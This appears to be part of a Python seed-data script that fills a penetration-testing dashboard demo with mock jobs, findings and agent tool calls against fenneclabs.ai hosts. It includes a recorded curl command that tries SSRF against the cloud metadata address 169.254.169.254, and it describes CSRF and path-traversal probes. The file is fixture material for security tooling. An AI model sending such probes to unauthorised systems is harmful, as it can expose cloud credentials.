        _tool_call(job_id=j2.id, tool_name="terminal",
                   tool_input={"cmd": "curl -X POST https://fenneclabs.ai/api/webhooks/test -d 'url=http://169.254.169.254/latest/meta-data/'"},
                   agent="pentester", success=True,
                   result="awaiting response (in progress — 4s elapsed)", minutes_ago=1),
    ]
    JOBS.put(j2)

    # ================================================================
    # JOB 3 — staging, completed, medium CSRF
    # ================================================================
    j3 = Job(
        id=str(uuid.uuid4()),
        name="Pre-release pass — staging",
        target_url="https://staging.fenneclabs.ai",
        mode="black_box",
        method="balanced",
        htli=False,
        target_id=t_staging.id,
        timeout_seconds=900,
        status="completed",
        success=True,
        created_at=_ts(days_ago=1, hours_ago=4),
        updated_at=_ts(days_ago=1, hours_ago=3, minutes_ago=18),
        final_result="One medium-severity issue: CSRF on the export-data endpoint (no SameSite cookie + no token).",
    )
    j3.hypotheses = [
        _hyp(hid="H1", title="CSRF on /api/users/me/export",
             description="Endpoint accepts cross-origin POSTs and triggers a data-export email.",
             status="completed", result="vulnerable", severity="medium", priority=0.7,
             owasp_category="A01:2021 Broken Access Control", days_ago=1.15, completed_minutes_ago=82),
        _hyp(hid="H2", title="SQL injection on /api/search",
             description="Search endpoint parameter handling.",
             status="completed", result="safe", severity=None, priority=0.5,
             days_ago=1.15, completed_minutes_ago=60),
        _hyp(hid="H3", title="Path traversal on /static/{file}",
             description="Test ../ payloads.",
             status="completed", result="safe", severity=None, priority=0.45,
             days_ago=1.15, completed_minutes_ago=44),
    ]
    j3.findings = [
        _finding(fid=f"{j3.id}-f1", job_id=j3.id, title="CSRF on data-export endpoint",
                 description="POST /api/users/me/export accepts cross-origin form submissions with no CSRF token and the session cookie has SameSite=None.",
                 severity="medium", location="/api/users/me/export", parameter="-",
                 evidence="Cross-origin <form action=https://staging.fenneclabs.ai/api/users/me/export method=POST> triggers email export for the victim.",
                 vuln_type="CSRF", cwe="CWE-352", hypothesis_id="H1", days_ago=1.15),
    ]
    j3.pentester_results = [
        _pentester_result(fid=1, job_id=j3.id, hypothesis_id="H1", verdict="medium",
                          overview="The data-export endpoint can be invoked from any origin without a CSRF token.",
                          impact="An attacker who lures a logged-in user to a malicious page can trigger a full data export to the victim's own email — useful in social-engineering chains.",
                          remediation="Require a CSRF token tied to the session, OR set SameSite=Strict on the session cookie. Prefer both.",
                          owasp="A01:2021 Broken Access Control",
                          evidence_lines=["Auto-submitting cross-origin form to /api/users/me/export → 200, victim receives export email"],
                          days_ago=1.15),
    ]
    JOBS.put(j3)

    # ================================================================
    # JOB 4 — marketing static-site, clean
    # ================================================================
    j4 = Job(
        id=str(uuid.uuid4()),
        name="Marketing static-site pass — fenneclabs.ai/about",
        target_url="https://fenneclabs.ai/about",
        mode="black_box",
        method="turbo",
        htli=False,
        target_id=t_main.id,
        timeout_seconds=300,
        status="completed",
        success=False,
        created_at=_ts(days_ago=4),
        updated_at=_ts(days_ago=4, hours_ago=-0.1),
        final_result="No vulnerabilities confirmed. The /about marketing page is a static React render.",
    )
    j4.hypotheses = [
        _hyp(hid="H1", title="XSS via marketing CMS content",
             description="Check if any team-bios are rendered from a CMS unescaped.",
             status="completed", result="safe", severity=None, priority=0.4,
             days_ago=4, completed_minutes_ago=22),
        _hyp(hid="H2", title="Subdomain takeover on cdn.fenneclabs.ai",
             description="Dangling CNAME check.",
             status="completed", result="safe", severity=None, priority=0.6,
             days_ago=4, completed_minutes_ago=18),
    ]
    JOBS.put(j4)

    # ================================================================
    # JOB 5 — internal demo-app, failed (Docker missing)
    # ================================================================
    j5 = Job(
        id=str(uuid.uuid4()),
        name="Internal demo app — Docker missing",
        target_url="https://demo-app.internal.fennec.dev",
        mode="black_box",
        method="balanced",
        htli=False,
        target_id=t_demo.id,
        timeout_seconds=600,
        status="failed",
        created_at=_ts(days_ago=3, hours_ago=2),
        updated_at=_ts(days_ago=3, hours_ago=1, minutes_ago=58),
        error="Docker image 'fennec-linux' not found locally. Run `cd linux && make build` first.",
    )
    JOBS.put(j5)

    # ================================================================
    # HISTORICAL SCANS (j6+) — spread across 28 days so the
    # findings-trend chart has shape. Each is completed, each contributes
    # a small number of severity-mixed findings.
    # ================================================================
    history = [
        # (days_ago, target, name, severities[])
        (2,  t_api,     "API gateway weekly",           ["high", "low"]),
        (3,  t_admin,   "Admin console weekly",         ["medium"]),
        (5,  t_app,     "Customer app weekly",          ["high", "medium", "low"]),
        (7,  t_main,    "Production baseline (prev)",   ["medium", "low"]),
        (9,  t_billing, "Billing service weekly",       ["high"]),
        (11, t_legacy,  "Legacy 2021 dashboard sweep",  ["critical", "high", "high", "medium"]),
        (14, t_staging, "Staging — release candidate",  ["medium", "low"]),
        (16, t_api,     "API gateway weekly",           ["low"]),
        (19, t_app,     "Customer app weekly",          ["high", "low"]),
        (22, t_main,    "Production baseline (older)",  ["medium"]),
        (25, t_billing, "Billing service weekly",       ["medium", "medium"]),
        (28, t_legacy,  "Legacy 2021 dashboard sweep",  ["critical", "high"]),
    ]
    for idx, (days_ago, target, name, severities) in enumerate(history):
        jid = str(uuid.uuid4())
        job = Job(
            id=jid,
            name=f"{name} ({days_ago}d ago)",
            target_url=f"https://{target.domain}",
            mode="black_box",
            method="balanced" if days_ago > 7 else "turbo",
            htli=False,
            target_id=target.id,
            timeout_seconds=900,
            status="completed",
            success=bool(severities),
            created_at=_ts(days_ago=days_ago, minutes_ago=-2),
            updated_at=_ts(days_ago=days_ago),
            final_result=(
                f"Confirmed {len(severities)} finding(s) on {target.domain}."
                if severities
                else f"No vulnerabilities confirmed on {target.domain}."
            ),
        )
        for sev_idx, sev in enumerate(severities):
            fid = f"{jid}-f{sev_idx + 1}"
            job.findings.append(
                _finding(
                    fid=fid, job_id=jid,
                    title=f"{sev.title()}-severity issue on {target.domain}",
                    description=f"Pre-baked historical {sev}-severity finding for trend-chart shape.",
                    severity=sev,
                    location=f"https://{target.domain}/api/example",
                    parameter="id",
                    evidence="<historical, see report archive>",
                    vuln_type="Historical",
                    cwe=None,
                    hypothesis_id=None,
                    days_ago=days_ago,
                )
            )
        JOBS.put(job)
